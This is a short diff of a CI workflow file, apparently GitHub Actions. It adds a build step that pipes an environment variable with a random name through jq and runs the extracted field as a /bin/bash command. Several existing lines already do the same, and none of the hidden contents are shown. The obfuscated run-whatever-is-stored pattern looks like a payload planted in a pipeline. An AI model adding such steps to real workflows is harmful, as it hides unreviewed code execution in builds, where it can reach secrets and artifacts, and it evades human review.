@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$mm99378" | jq -r .tqo85924 | /bin/bash
           echo $remew3 | jq -r .gy24 | /bin/bash
           echo $nvdqo8647 | jq -r .mvho44092 | /bin/bash
+          printf '%s' "$hjq2015" | jq -r .zeag28 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
